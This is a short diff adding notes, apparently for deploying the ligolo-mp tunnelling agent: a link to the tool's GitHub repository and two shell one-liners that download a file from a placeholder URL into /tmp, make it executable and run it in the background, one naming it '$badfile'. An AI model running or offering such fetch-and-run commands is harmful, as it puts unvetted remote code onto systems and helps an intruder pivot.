@@ -1,0 +1,3 @@
+官方地址：https://github.com/ttpreport/ligolo-mp
+#cd /tmp && wget $downloadurl && chmod +x agnet && ./agent &
+cd /tmp && wget $downloadurl && chmod +x $badfile && ./$badfile &
